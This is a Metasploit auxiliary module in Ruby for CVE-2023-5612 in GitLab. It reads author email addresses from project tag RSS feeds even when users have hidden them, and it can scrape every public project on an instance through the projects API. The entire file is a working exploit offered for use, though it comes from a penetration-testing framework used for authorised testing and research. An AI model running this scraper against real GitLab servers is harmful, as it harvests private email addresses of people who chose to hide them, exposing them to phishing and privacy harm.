##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GitLab Tags RSS feed email disclosure',
        'Description' => %q{
          An issue has been discovered in GitLab affecting all versions
          before 16.6.6, 16.7 prior to 16.7.4, and 16.8 prior to 16.8.1.
          It is possible to read the user email address via tags feed
          although the visibility in the user profile has been disabled.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'n00bhaxor', # msf module
          'erruquill' # HackerOne Bug Bounty, analysis
        ],
        'References' => [
          [ 'URL', 'https://about.gitlab.com/releases/2024/01/25/critical-security-release-gitlab-16-8-1-released/' ],
          [ 'URL', 'https://hackerone.com/reports/2208790'],
          [ 'CVE', '2023-5612']
        ],
        'DisclosureDate' => '2024-01-25',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The URI of the GitLab Application', '/']),
        OptString.new('TARGETPROJECT', [ false, 'Workspace and project to target', nil])
      ]
    )
  end

  def get_contents(tags)
    vprint_status('Check RSS tags feed for: ' + tags)

    # Tag needs to be lower case, so...
    tags.sub!(%r{^/}, '') if tags.start_with?('/')
    tags = "#{tags.split('/')[0]}/#{tags.split('/')[1].downcase}"

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, tags, '-', 'tags'),
      'method' => 'GET',
      'vars_get' => { 'format' => 'atom' }
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?

    if res.code == 200
      xml_res = res.get_xml_document

    # If we receive a 301 it's probably an issue with workspace case-insensitivty
    elsif res.code == 301 && res['location']
      new_uri = URI.parse(res['location']).path
      res = send_request_cgi(
        'uri' => normalize_uri(new_uri.to_s),
        'method' => 'GET', 'vars_get' => { 'format' => 'atom' }
      )
      xml_res = res.get_xml_document

      # Error out with an unreachable or any other error code
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Project does not exist or is not public (response code: #{res.code})")
    end

    # Check to see if there are any tags with authors
    author_element = 'author'
    not_found = xml_res.xpath("//xmlns:#{author_element}").empty?
    if not_found
      vprint_bad('No tags or authors found')
      return
    end

    # Initialze an empty set so we can dedupe authors based on email address
    # This only dedupes within a project, not the entirety of Gitlab,
    # so forks of projects may show duplicate email addresses.
    unique_emails = Set.new

    xml_res.xpath('//xmlns:author').each do |authors|
      email = authors.at_xpath('xmlns:email').text
      next if unique_emails.include?(email)

      name = authors.at_xpath('xmlns:name').text
      print_good("name: #{name}")
      print_good("e-mail: #{email}")
      unique_emails << email
    end
  end

  def run
    unless datastore['TARGETPROJECT'].blank?
      get_contents(datastore['TARGETPROJECT'].to_s)
      return
    end

    print_good('Scraping ALL projects...')
    request = {
      'uri' => normalize_uri(target_uri.path, '/api/v4/projects'),
      'method' => 'GET', 'vars_get' => {
        'output_mode' => 'json'
      }
    }

    res = send_request_cgi(request)

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Project list API endpoint unavailable (response code: #{res.code})") unless res.code == 200

    res.get_json_document.each do |entry|
      tags = entry['path_with_namespace']
      get_contents(tags)
    end
  end
end
